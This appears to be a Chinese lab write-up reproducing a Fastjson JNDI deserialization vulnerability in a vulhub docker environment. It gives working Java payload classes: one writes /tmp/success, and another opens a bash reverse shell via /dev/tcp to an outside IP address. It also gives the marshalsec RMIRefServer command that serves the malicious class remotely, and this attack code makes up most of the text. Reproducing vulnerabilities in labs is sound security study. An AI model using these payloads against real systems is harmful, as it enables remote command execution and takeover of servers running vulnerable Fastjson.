ailx10说：这篇是2023年11月之前写的，后来又改过。这回给 Fastjson 的实验排了三个台阶：先看 DNS，再创建文件，最后做连接。每往后一步，都比上一条线索多确认一点事情，也能少把“有一次解析”误当成完整执行。笔记里我追的是类缓存、白名单和 JNDI 怎么接起来，而不是只背一个版本号。JSON 本来是数据，进入特定类型和调用链以后才可能变成别的能力，这正是我想通过小实验看清的地方；换了解析配置、依赖或者 Java 环境，结果也可能跟着变。

---

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

（2）任意命令执行（演示写文件）[\[2\]](#ref_2)

- 向文件 /tmp目录写入文件 success ，`javac TouchFile.java` 编译 class文件

```
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/success"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

- 启动一个HTTP服务

![](/notes-assets/12e8ffa792adf10a6cbe.webp)

- 借助marshalsec项目[\[3\]](#ref_3)，编译一个RMI服务器

```
mvn clean package -DskipTests
```

（3）反弹shell[\[4\]](#ref_4)

- `javac Getshell.java` 编译 class文件

```
// Getshell.java
import java.lang.Runtime;
import java.lang.Process;

public class Getshell {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"bash", "-c", "bash -i>& /dev/tcp/174.137.58.6/8888 0>&1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

- 启动一个HTTP服务（同上，略）
- 启动RMI服务器，监听9999端口，并加载远程类 `Getshell.class` （同上）

```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://174.137.58.6:7777/#Getshell" 9999
```

- 监听8888端口
